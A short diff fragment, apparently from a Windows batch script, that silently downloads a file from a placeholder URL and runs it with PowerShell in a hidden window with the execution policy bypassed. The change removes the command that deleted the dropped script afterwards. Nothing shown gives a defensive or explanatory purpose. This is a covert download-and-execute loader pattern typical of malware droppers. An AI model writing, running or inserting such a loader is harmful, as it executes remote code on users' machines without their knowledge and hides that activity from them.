@@ -6,4 +6,3 @@ powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%psFileUrl%' -O
 
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psFilePath%"
 
-del "%psFilePath%"
